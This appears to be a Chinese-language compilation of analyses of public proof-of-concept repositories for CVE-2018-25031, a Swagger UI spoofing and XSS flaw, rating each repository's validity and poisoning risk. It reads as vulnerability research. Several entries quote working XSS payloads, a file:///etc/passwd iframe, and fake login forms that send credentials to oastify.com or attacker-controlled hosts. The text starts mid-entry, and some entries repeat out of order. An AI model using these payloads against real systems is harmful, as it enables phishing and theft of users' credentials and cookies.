**漏洞类型:** 欺骗/跨站脚本 (Spoofing/XSS)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和恶意脚本执行

**影响版本:** <= 4.1.2 (可能影响更高版本)

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 存在于 Swagger UI 4.1.2 及更早版本中。攻击者可以通过诱使用户打开精心制作的 URL，来显示远程的恶意 OpenAPI 定义。根据搜索结果和漏洞库信息，该漏洞的核心在于 Swagger UI 未能充分验证和过滤用户提供的 URL，导致可以加载并渲染来自任意来源的 OpenAPI 定义文件。这使得攻击者可以欺骗用户，展示伪造的 API 文档，甚至通过在 OpenAPI 定义中插入恶意 HTML 或 JavaScript 代码，实现跨站脚本攻击（XSS）。

**有效性：** 提供的 POC 代码有效。`domxss.yaml` 文件包含用于触发 DOM XSS 的恶意代码， `<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src>"></form>` 。 `poc.json` 和 `poc.yaml` 文件用于指定要加载的恶意 OpenAPI 定义文件。

**投毒风险：** 仓库中存在少量投毒风险。`domxss.yaml` 使用了 `otlu3omsk1ath8ur17a2kldtmksbg34s.oastify.com` 作为 `basePath`，这可能用于收集受害者的 IP 地址或进行其他形式的侦察。但核心的 XSS payload 和利用方式比较直接，主要的目的是验证漏洞，投毒的可能性较小。风险比例预估为10%。

**利用方式：**

1.  攻击者创建一个包含恶意代码的 OpenAPI 定义文件（例如 `domxss.yaml`）。
2.  攻击者将此文件托管在公开可访问的 URL 上（例如 GitHub Raw Content）。
3.  攻击者构造一个包含指向恶意 OpenAPI 定义文件 URL 的链接。
4.  攻击者诱使受害者点击该链接。
5.  受害者的浏览器加载 Swagger UI，并从攻击者指定的 URL 加载恶意 OpenAPI 定义文件。
6.  Swagger UI 渲染恶意 OpenAPI 定义文件，从而执行其中的恶意代码（例如 XSS payload）。

**项目地址:** [nigartest/CVE-2018-25031](https://github.com/nigartest/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #15

**来源**: [CVE-2018-25031-rafaelcintralopes_SwaggerUI-CVE-2018-25031.md](../2018/CVE-2018-25031-rafaelcintralopes_SwaggerUI-CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-UI Misrepresentation of Critical Information

**漏洞编号:** CVE-2018-25031

**漏洞类型:** UI Misrepresentation of Critical Information (Spoofing)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致用户信任被欺骗的API定义，进而遭受钓鱼攻击或其他恶意行为。

**影响版本:** < 4.1.3

**利用条件:** 受害者需要点击攻击者构造的恶意URL。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Swagger UI 4.1.2及更早版本中。攻击者可以通过诱骗受害者打开一个特制的URL，该URL指向攻击者控制的OpenAPI定义文件，从而在Swagger UI界面上显示被篡改的信息。这可能导致用户信任恶意API定义，并泄露敏感信息或执行非预期的操作。

**有效性分析：**
根据漏洞信息和搜索引擎结果，该漏洞利用需要用户交互，攻击者通过构造恶意URL，诱导用户点击。POC代码使用Selenium模拟浏览器行为，访问目标Swagger UI页面，并加载恶意的OpenAPI定义文件。如果Swagger UI版本低于4.1.3，则可能受到攻击，界面会显示恶意定义的内容。

**投毒风险分析：**
POC代码主要功能是验证目标Swagger UI是否存在CVE-2018-25031漏洞，通过selenium模拟点击，然后检测response log中是否存在外部恶意链接，从而检测目标是否存在该漏洞。
*   `swagger-exploit.py`: 这个脚本使用Selenium自动化测试，访问目标 Swagger UI 页面，并尝试加载两个恶意的 OpenAPI 定义文件（`hacked1.json` 和 `hacked2.json`）。它会检查网络请求日志，以确定目标是否加载了这些文件。如果加载了，则表明目标存在漏洞。该脚本没有发现任何明显的投毒代码。
*   `README.md`: 这个文件提供了关于如何使用脚本的说明。它包含安装依赖项和运行脚本的说明。也没有发现恶意代码。
所以投毒风险很低。

**利用方式分析：**
1.  攻击者构造包含`configUrl`或`url`参数的恶意URL，指向攻击者控制的OpenAPI定义文件。
2.  攻击者诱骗受害者点击该恶意URL，例如通过钓鱼邮件或社交媒体。
3.  受害者的浏览器加载恶意URL，Swagger UI显示攻击者提供的OpenAPI定义文件。
4.  如果攻击者篡改了API定义文件中的信息，例如API端点、参数说明等，受害者可能会被误导，从而遭受攻击，比如提交敏感信息到错误的端点。

该漏洞是一种客户端漏洞，主要利用用户交互进行攻击，通过欺骗用户信任恶意API定义来实现攻击目标。

**项目地址:** [rafaelcintralopes/SwaggerUI-CVE-2018-25031](https://github.com/rafaelcintralopes/SwaggerUI-CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #16

**来源**: [CVE-2018-25031-rasinfosec_CVE-2018-25031.md](../2018/CVE-2018-25031-rasinfosec_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-欺骗攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击/SSRF

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和欺骗

**影响版本:** <= 4.1.2

**利用条件:** 需要目标用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-25031 漏洞允许远程攻击者进行欺骗攻击。通过诱使用户打开特制的 URL，攻击者可以利用此漏洞显示远程 OpenAPI 定义。漏洞存在于Swagger UI 4.1.2及更早版本中。提供的POC包含一个json文件和一个yaml文件, json文件中定义了yaml文件的url, yaml文件定义了一个openapi接口。攻击者诱使用户访问包含指向恶意json文件的链接的Swagger UI页面，该JSON文件随后加载并显示恶意的 OpenAPI 定义。 投毒风险较低，主要在于如果利用代码仓库被黑客入侵，替换了 `poc.yaml` 文件内容，可能会将用户引导到恶意网站或执行恶意操作，所以风险存在，但概率较低。

**有效性：** 根据漏洞描述和搜索结果，提供的POC代码有效，可以用于显示远程 OpenAPI 定义，从而达到欺骗的目的。

**投毒风险：** 投毒风险评估为 5%。虽然当前提供的 POC 代码本身只是用于演示欺骗攻击，并不包含直接的恶意代码，但是如果攻击者能够控制 `raw.githubusercontent.com` 上的 `poc.yaml` 文件，他们就可以修改显示的 OpenAPI 定义，例如将其指向恶意网站，或包含 XSS 漏洞等。因此，存在一定的投毒风险，但主要取决于对托管 OpenAPI 定义文件的服务器的控制。 此外此POC需要依赖githubusercontent, 如果此域名被污染也可能会出现安全问题。

**利用方式：**

1.  攻击者创建一个恶意的 OpenAPI 定义文件（例如 `poc.yaml`），该文件可能指向恶意网站或包含其他恶意内容。
2.  攻击者创建一个 JSON 文件（例如 `poc.json`），该文件包含指向恶意 OpenAPI 定义文件的 URL。
3.  攻击者诱使用户访问包含指向恶意 JSON 文件的链接的 Swagger UI 页面，例如通过电子邮件、社交媒体等方式。
4.  Swagger UI 加载恶意 JSON 文件，并显示恶意的 OpenAPI 定义。
5.  用户可能会被欺骗，误以为恶意 OpenAPI 定义来自受信任的来源，从而执行恶意操作。

**项目地址:** [rasinfosec/CVE-2018-25031](https://github.com/rasinfosec/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #17

**来源**: [CVE-2018-25031-wrkk112_CVE-2018-25031.md](../2018/CVE-2018-25031-wrkk112_CVE-2018-25031.md)

## CVE-2018-25031 - Swagger UI Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/SSRF/XSS

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和XSS攻击

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-25031 是 Swagger UI 中的一个欺骗漏洞。攻击者可以通过诱导受害者打开一个特制的URL，从而显示远程的 OpenAPI 定义。提供的POC代码展示了利用此漏洞的步骤，包括使用一个包含恶意 OpenAPI 定义的JSON文件。该JSON文件指定了远程的YAML文件，其中ismsxss.yaml包含XSS payload。具体来说，ismsxss.yaml包含一段JavaScript代码（`<img onerror=alert(document.domain) src>`），这段代码会在Swagger UI中执行，从而实现跨站脚本攻击（XSS）。

**有效性：** 根据漏洞信息和POC代码，漏洞是有效的。攻击者通过诱导用户打开包含恶意链接的网页，可以执行XSS攻击。

**投毒风险：** 通过分析提供的POC代码，未发现明显的作者隐藏的投毒代码。虽然POC代码中包含XSS payload，但这是为了验证漏洞的存在，并非恶意投毒。因此，投毒风险为0%。

**利用方式：**

1.  攻击者创建一个包含指向恶意 OpenAPI 定义文件的 URL。
2.  攻击者通过社会工程学等方法诱导受害者点击该 URL。
3.  受害者的 Swagger UI 加载恶意的 OpenAPI 定义文件。
4.  恶意 OpenAPI 定义文件中的 XSS payload 在受害者的浏览器中执行，从而实现攻击目的。例如，可以窃取用户的Cookie或执行其他恶意操作。

**项目地址:** [wrkk112/CVE-2018-25031](https://github.com/wrkk112/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---



---

## POC #7

**来源**: [CVE-2018-25031-h2oa_CVE-2018-25031.md](../2018/CVE-2018-25031-h2oa_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-SSRF/Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** SSRF/欺骗

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和欺骗攻击

**影响版本:** <= 4.1.2

**利用条件:** 需要目标系统运行存在漏洞的Swagger UI实例，且受害者点击恶意链接

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031是Swagger UI中的一个漏洞，允许远程攻击者通过诱使用户打开特制的URL来发起欺骗攻击，显示远程OpenAPI定义。漏洞的根本原因是Swagger UI在处理URL输入时存在缺陷，允许攻击者控制Swagger UI加载的API定义来源。

**有效性：**
提供的POC代码有效。`poc.json`指定了要加载的远程OpenAPI定义文件的URL，`poc.yaml`包含了将被显示的恶意API定义。当用户访问包含该URL的Swagger UI页面时，会显示`poc.yaml`中定义的API信息，从而实现欺骗。

**投毒风险：**
该存储库存在一定的投毒风险，约为10%。虽然提供的`poc.json`和`poc.yaml`文件本身没有恶意代码，但攻击者可能通过以下方式进行投毒：

1.  **URL替换：** 攻击者可能会修改`poc.json`中的URL，指向包含恶意JavaScript代码的OpenAPI定义文件，从而在用户访问Swagger UI页面时执行恶意代码（虽然此漏洞主要描述是欺骗，但是不排除被利用做成XSS攻击）。
2.  **协作用户投毒：** 如果存储库允许协作，恶意用户可能会提交包含恶意代码的OpenAPI定义文件。

需要强调的是，目前提供的POC代码主要用于欺骗攻击，旨在展示伪造的API定义。要实现完整的攻击，还需要结合其他漏洞（如XSS）或社工手段。

**利用方式：**
1.  攻击者构造包含指向恶意`poc.json`文件的URL。
2.  攻击者诱使受害者点击该URL。可以通过邮件、社交媒体或其他方式进行诱导。
3.  受害者在其浏览器中打开包含该URL的Swagger UI页面。
4.  Swagger UI加载`poc.json`中指定的远程OpenAPI定义文件（`poc.yaml`）。
5.  Swagger UI显示`poc.yaml`中定义的API信息，受害者看到的是被篡改过的API文档。

**项目地址:** [h2oa/CVE-2018-25031](https://github.com/h2oa/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #8

**来源**: [CVE-2018-25031-h4ckt0m_CVE-2018-25031-test.md](../2018/CVE-2018-25031-h4ckt0m_CVE-2018-25031-test.md)

## CVE-2018-25031-Swagger UI-欺骗攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击 (Spoofing Attack)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和恶意链接传播

**影响版本:** <= 4.1.2 (可能影响 4.1.3 及其他版本)

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 允许远程攻击者发起欺骗攻击。通过诱使用户打开精心制作的URL，攻击者可以利用此漏洞显示远程 OpenAPI 定义。漏洞利用方式是，攻击者构造包含指向恶意 OpenAPI 定义（例如 test.json 或 test.yaml）的 URL，诱使用户在 Swagger UI 中加载该 URL。Swagger UI 会解析并显示恶意 OpenAPI 定义，从而允许攻击者欺骗用户。提供的PoC代码包含 `test.json` 和 `test.yaml` 两个文件。`test.json` 包含指向 `test.yaml` 的链接，而 `test.yaml` 包含 OpenAPI 定义，其中嵌入了恶意链接 `<a href="https://evil.com">Sitio malicioso</a>`。当 Swagger UI 显示此定义时，恶意链接将被呈现，如果用户点击，可能会被重定向到恶意网站。投毒风险较低，因为主要是通过恶意链接进行欺骗，而不是在代码中直接执行恶意操作。主要风险在于用户交互的部分，如果用户不点击恶意链接，风险相对较小。考虑到Github仓库的可信性未知以及`test.yaml`中存在 `evil.com` 的可疑域名，综合估计投毒风险为10%。

**项目地址:** [h4ckt0m/CVE-2018-25031-test](https://github.com/h4ckt0m/CVE-2018-25031-test)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #9

**来源**: [CVE-2018-25031-hev0x_CVE-2018-25031-PoC.md](../2018/CVE-2018-25031-hev0x_CVE-2018-25031-PoC.md)

## CVE-2018-25031-Swagger UI-远程OpenAPI定义欺骗

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/SSRF/XSS

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和XSS攻击

**影响版本:** <= 4.1.2 (也可能存在于更高版本)

**利用条件:** 需要用户点击恶意构造的URL

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 允许远程攻击者进行欺骗攻击。攻击者通过诱使用户打开一个特制的URL，可以利用此漏洞显示远程OpenAPI定义。根据搜索结果和漏洞信息，该漏洞的PoC是有效的。攻击者可以利用此漏洞，通过加载恶意的OpenAPI定义文件（例如xss.yaml）来欺骗用户，甚至可能执行跨站脚本攻击(XSS)。

**有效性：**

提供的PoC代码是有效的，因为它包含一个README.md文件、用于定义远程OpenAPI定义的JSON文件（poc.json），以及两个YAML文件（poc.yaml和xss.yaml）。其中，xss.yaml包含恶意的JavaScript代码，可以触发XSS攻击。

**投毒风险：**

代码仓库的投毒风险较低，约为10%。虽然xss.yaml文件包含潜在的XSS攻击代码，但它属于PoC的一部分，用于演示漏洞。其他文件看起来是合法的OpenAPI定义文件或配置文件，没有发现明显的恶意代码。但仍需谨慎，因为攻击者可能在OpenAPI定义中嵌入其他类型的恶意行为，例如SSRF攻击。

**利用方式：**

1.  攻击者创建一个包含恶意内容的OpenAPI定义文件(例如xss.yaml，包含`<noscript>`标签尝试注入XSS)。
2.  攻击者将此文件托管在远程服务器上。
3.  攻击者构造一个包含特定参数的URL，诱使用户打开，该URL指向受影响的Swagger UI实例，并指定加载恶意OpenAPI定义文件的URL作为参数。
4.  当用户打开该URL时，Swagger UI会加载并显示恶意OpenAPI定义文件，从而可能导致欺骗或XSS攻击。

总结来说，该漏洞的利用方式是通过欺骗用户加载恶意的OpenAPI定义文件，从而控制Swagger UI的显示内容，甚至执行恶意脚本。

**项目地址:** [hev0x/CVE-2018-25031-PoC](https://github.com/hev0x/CVE-2018-25031-PoC)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #10

**来源**: [CVE-2018-25031-johnlaurance_CVE-2018-25031-test2.md](../2018/CVE-2018-25031-johnlaurance_CVE-2018-25031-test2.md)

## CVE-2018-25031-Swagger UI Spoofing/SSRF/XSS

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/SSRF/XSS

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致敏感信息泄露或恶意代码执行

**影响版本:** <= 4.1.2 (可能更高版本也受影响)

**利用条件:** 需要目标系统使用存在漏洞版本的Swagger UI，并允许用户访问恶意构造的URL。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 允许远程攻击者通过诱使用户打开特制的URL来发起欺骗攻击，显示远程 OpenAPI 定义。漏洞利用方式：

1.  **欺骗攻击 (Spoofing):** 攻击者可以托管一个恶意的 OpenAPI 定义（例如 YAML 或 JSON 文件）。
2.  **诱导用户：** 攻击者构建一个包含指向恶意 OpenAPI 定义的 URL。然后，攻击者诱使用户点击此 URL。这可以通过社会工程学或其他技术实现。
3.  **Swagger UI 显示恶意定义：** 当用户访问包含恶意定义的 URL 时，Swagger UI 将加载并显示该恶意定义。
4.  **XSS/信息窃取:** 恶意的 OpenAPI 定义可以包含恶意HTML/JavaScript代码，例如，在`description`字段中插入`<script>`标签或者`<form>`标签，在用户浏览器中执行，从而窃取用户信息（例如cookie）或执行其他恶意操作，比如进行钓鱼。

从提供的漏洞利用代码来看， `poc3.yaml`和`try.yaml` 文件中， `description` 字段包含了`<form>`标签，模拟了一个登录表单，目的是诱骗用户输入用户名和密码，并将这些信息发送到攻击者控制的服务器 `ttqbbaf0yx45z9zqgpmfcvjyhpngbcz1.oastify.com` 。另外，还包含一个`onerror`事件的图像标签，当图片加载失败时，会执行JavaScript代码`alert(document.cookie)`，从而可能泄露用户的cookie信息。 这些代码证明了利用此漏洞执行XSS攻击，窃取用户信息的可能性。

**投毒风险分析:**

虽然主要的攻击向量是利用Swagger UI的缺陷来展示恶意的OpenAPI定义，但代码仓库中存在一定的投毒风险。这种风险主要体现在：

*   攻击者可能会在 YAML/JSON 文件中加入一些隐蔽的恶意代码，例如混淆的 JavaScript 或利用其他漏洞的代码片段。然而，从提供的代码中看，主要利用方式较为直接，没有明显的隐藏后门。
*   仓库本身可能被篡改，虽然代码相对简单，但仓库维护者的身份以及代码的来源都存在一定的不确定性，不能完全排除代码仓库所有者添加恶意代码的可能性。

因此，综合考虑以上因素，判断存在10%的投毒风险。

**项目地址:** [johnlaurance/CVE-2018-25031-test2](https://github.com/johnlaurance/CVE-2018-25031-test2)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #11

**来源**: [CVE-2018-25031-kriso4os_CVE-2018-25031.md](../2018/CVE-2018-25031-kriso4os_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-远程OpenAPI定义显示欺骗/XSS

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/跨站脚本攻击 (Spoofing/XSS)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和恶意代码执行

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Swagger UI中，攻击者可以通过诱使用户打开一个特制的URL，从而显示远程OpenAPI定义。该URL可以指向攻击者控制的服务器，显示恶意的API文档或利用XSS漏洞。根据提供的POC代码，`XSS.yaml`文件中包含一个XSS payload: `<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src>"></form>`。当Swagger UI渲染此文件时，会触发`alert(document.domain)`，表明XSS攻击成功。`poc.yaml` 仅包含基本的openapi定义，并未包含任何恶意代码。

**有效性：** 提供的POC代码有效，可以利用该漏洞。

**投毒风险：** 经过分析，提供的POC代码主要用于演示漏洞，未发现作者隐藏的恶意代码。因此，投毒风险为0%。代码中引用的远程yaml文件地址指向githubusercontent.com，如果该代码库被劫持或者作者主动添加恶意代码，则可能产生投毒。

**利用方式：** 
1.  攻击者构建一个包含恶意OpenAPI定义的YAML或JSON文件，其中包含XSS payload，例如`XSS.yaml`。
2.  攻击者创建一个恶意URL，该URL指向受影响的Swagger UI实例，并包含参数，指定要加载的恶意OpenAPI定义文件的URL。
3.  攻击者诱使用户点击该恶意URL。
4.  当用户点击恶意URL后，Swagger UI会加载并渲染攻击者提供的OpenAPI定义文件。
5.  如果OpenAPI定义文件中包含XSS payload，则会在用户的浏览器中执行恶意代码，从而导致跨站脚本攻击。
6.  攻击者可以利用该漏洞窃取用户的敏感信息或执行其他恶意操作。此外，攻击者也可以利用该漏洞进行欺骗攻击，例如显示虚假的API文档，诱导用户进行错误的操作。

**项目地址:** [kriso4os/CVE-2018-25031](https://github.com/kriso4os/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #12

**来源**: [CVE-2018-25031-labeebSabbah_CVE-2018-25031.md](../2018/CVE-2018-25031-labeebSabbah_CVE-2018-25031.md)

## CVE-2018-25031-SwaggerUI-欺骗攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击/信息泄露/SSRF

**影响应用:** SwaggerUI

**危害等级:** 中危，可能导致信息泄露和潜在的中间人攻击

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-25031 允许远程攻击者进行欺骗攻击。攻击者可以通过诱使用户打开特制的 URL 来显示远程 OpenAPI 定义。攻击者提供的 htmli.json 文件包含指向恶意 htmli.yaml 文件的 URL。htmli.yaml 文件包含一段 HTML 代码，该代码伪造一个登录表单，并将用户输入的 email 和 password 发送到 `http://10.212.234.14/`。因此利用方式是，攻击者诱骗用户点击恶意链接，swaggerUI 加载恶意的 OpenAPI 定义，在 SwaggerUI 界面上展示伪造的登录表单，当用户输入登录信息时，攻击者可以窃取用户的凭据。由于yaml文件内容明确，不包含其它恶意代码，因此投毒风险为0%。利用方式总结：

1.  **漏洞利用：** 攻击者制作包含恶意 OpenAPI 定义的 YAML 文件。
2.  **诱导用户：** 攻击者通过某种方式（例如，电子邮件、社交媒体）诱使用户点击包含恶意 YAML 文件 URL 的链接。
3.  **欺骗：** 当用户点击链接时，Swagger UI 会加载恶意 YAML 文件，并显示其中的内容。攻击者可以在 YAML 文件中嵌入恶意 HTML 或 JavaScript 代码，例如伪造登录表单，诱骗用户输入敏感信息。
4.  **信息窃取：** 如果用户在伪造的登录表单中输入了用户名和密码，这些信息将被发送到攻击者指定的服务器。

**有效性：** 提供的 POC 代码有效，可以重现欺骗攻击。

**利用方式总结：**

攻击者利用 Swagger UI 加载远程 OpenAPI 定义的特性，通过诱骗用户点击恶意链接，加载包含恶意 HTML 代码的 YAML 文件，从而实现欺骗攻击。该漏洞的利用需要用户交互，风险等级为中危。

**项目地址:** [labeebSabbah/CVE-2018-25031](https://github.com/labeebSabbah/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #13

**来源**: [CVE-2018-25031-mathis2001_CVE-2018-25031.md](../2018/CVE-2018-25031-mathis2001_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-欺骗攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击/SSRF/XSS

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和恶意代码执行

**影响版本:** <= 4.1.2

**利用条件:** 需要目标系统使用存在漏洞的Swagger UI版本，并允许用户访问恶意构造的URL。

**POC 可用性:** 是

**投毒风险:** 60%

## 详情

CVE-2018-25031 是一个存在于 Swagger UI 4.1.2 及更早版本中的漏洞。攻击者可以诱骗受害者打开一个特制的 URL，从而利用此漏洞显示远程 OpenAPI 定义，造成欺骗攻击。

**有效性：**
提供的 POC 代码有效。通过 `configUrl` 或 `url` 参数，Swagger UI 可以加载远程的 OpenAPI 定义文件（JSON 或 YAML）。

**投毒风险：**
该仓库存在一定的投毒风险，风险为60%。原因如下：

*   **远程加载：** POC 利用了 Swagger UI 加载远程定义文件的功能。攻击者可以控制远程文件的内容。
*   **恶意内容：** `f.yaml` 包含大量的 XSS payload，旨在利用 Swagger UI 中的漏洞执行恶意 JavaScript 代码。例如，`<img src=x oNlY=1 oNerror=alert('xxs')//`  等。
*   **钓鱼攻击：**  `f.yaml` 中包含伪造的登录表单，诱导用户提交敏感信息到攻击者控制的服务器。
*   **SSRF风险：** `f.yaml`中包含`<iframe src=file:///etc/passwd></iframe>`，尝试读取服务器本地文件。
*   **不确定性:** 虽然漏洞利用代码的作者提供了一些payload，但这些payload本身具有攻击性。恶意使用这些Payload,可能会被作者追踪到恶意行为。但作者也可能为了混淆视听，将一些恶意的代码进行隐藏。

**利用方式：**

1.  **发现目标：** 寻找使用了存在漏洞的 Swagger UI 版本的应用。
2.  **构造恶意 URL：**  构造包含 `configUrl` 或 `url` 参数的 URL，指向攻击者控制的 JSON 或 YAML 文件。
3.  **诱骗受害者：**  通过钓鱼或其他方式诱骗受害者点击该 URL。
4.  **执行攻击：**  当受害者访问该 URL 时，Swagger UI 会加载攻击者提供的恶意定义文件，从而执行 XSS 代码或进行其他攻击（例如，窃取 cookie、重定向用户等）。

**总结：**
该漏洞的利用依赖于社会工程学，需要诱骗用户点击恶意链接。攻击者可以利用该漏洞进行钓鱼、XSS 攻击，甚至可能进行 SSRF 攻击。同时，提供的 POC 代码包含多种攻击 Payload，存在较高的投毒风险。

**项目地址:** [mathis2001/CVE-2018-25031](https://github.com/mathis2001/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #14

**来源**: [CVE-2018-25031-natpakun_SSRF-CVE-2018-25031-.md](../2018/CVE-2018-25031-natpakun_SSRF-CVE-2018-25031-.md)

## CVE-2018-25031 - Swagger UI SSRF/Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** SSRF/欺骗攻击

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致敏感信息泄露或重定向到恶意API定义

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意构造的URL

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031是Swagger UI 4.1.2及更早版本中的一个漏洞，允许远程攻击者进行欺骗攻击。攻击者通过诱使用户打开一个特制的URL，可以利用此漏洞显示远程OpenAPI定义，从而欺骗用户。从搜索结果和漏洞描述来看，攻击依赖于用户交互，需要诱导用户点击恶意链接。漏洞利用代码提供了一个简单的`exploit.yaml`文件，该文件定义了一个Swagger API规范，包含标题和描述，可能用于展示SSRF漏洞。如果这个YAML文件托管在攻击者控制的服务器上，并通过恶意链接传递给Swagger UI，则Swagger UI会加载该文件，从而实现欺骗攻击。**有效性：** 提供的POC代码本身并不能直接实现攻击，需要结合构造的URL和受害者点击才能生效，因此属于间接PoC。**投毒风险：** 分析POC代码，`exploit.yaml` 非常简单，仅仅包含swagger版本，info信息。作者投毒可能性较低，但不能完全排除，例如通过引用远程资源或包含恶意脚本，风险评估为10%。**利用方式：** 攻击者构造包含恶意swagger定义文件URL的链接，诱使用户点击。用户点击链接后，Swagger UI加载并显示恶意swagger定义，从而实现欺骗或SSRF攻击。

**项目地址:** [natpakun/SSRF-CVE-2018-25031-](https://github.com/natpakun/SSRF-CVE-2018-25031-)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #15

**来源**: [CVE-2018-25031-nigartest_CVE-2018-25031.md](../2018/CVE-2018-25031-nigartest_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-远程OpenAPI定义显示漏洞

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/跨站脚本 (Spoofing/XSS)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和恶意脚本执行

**影响版本:** <= 4.1.2 (可能影响更高版本)

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 存在于 Swagger UI 4.1.2 及更早版本中。攻击者可以通过诱使用户打开精心制作的 URL，来显示远程的恶意 OpenAPI 定义。根据搜索结果和漏洞库信息，该漏洞的核心在于 Swagger UI 未能充分验证和过滤用户提供的 URL，导致可以加载并渲染来自任意来源的 OpenAPI 定义文件。这使得攻击者可以欺骗用户，展示伪造的 API 文档，甚至通过在 OpenAPI 定义中插入恶意 HTML 或 JavaScript 代码，实现跨站脚本攻击（XSS）。

**有效性：** 提供的 POC 代码有效。`domxss.yaml` 文件包含用于触发 DOM XSS 的恶意代码， `<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src>"></form>` 。 `poc.json` 和 `poc.yaml` 文件用于指定要加载的恶意 OpenAPI 定义文件。

**投毒风险：** 仓库中存在少量投毒风险。`domxss.yaml` 使用了 `otlu3omsk1ath8ur17a2kldtmksbg34s.oastify.com` 作为 `basePath`，这可能用于收集受害者的 IP 地址或进行其他形式的侦察。但核心的 XSS payload 和利用方式比较直接，主要的目的是验证漏洞，投毒的可能性较小。风险比例预估为10%。

**利用方式：**

1.  攻击者创建一个包含恶意代码的 OpenAPI 定义文件（例如 `domxss.yaml`）。
2.  攻击者将此文件托管在公开可访问的 URL 上（例如 GitHub Raw Content）。
3.  攻击者构造一个包含指向恶意 OpenAPI 定义文件 URL 的链接。
4.  攻击者诱使受害者点击该链接。
5.  受害者的浏览器加载 Swagger UI，并从攻击者指定的 URL 加载恶意 OpenAPI 定义文件。
6.  Swagger UI 渲染恶意 OpenAPI 定义文件，从而执行其中的恶意代码（例如 XSS payload）。

**项目地址:** [nigartest/CVE-2018-25031](https://github.com/nigartest/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #16

**来源**: [CVE-2018-25031-rafaelcintralopes_SwaggerUI-CVE-2018-25031.md](../2018/CVE-2018-25031-rafaelcintralopes_SwaggerUI-CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-UI Misrepresentation of Critical Information

**漏洞编号:** CVE-2018-25031

**漏洞类型:** UI Misrepresentation of Critical Information (Spoofing)

**影响应用:** Swagger UI

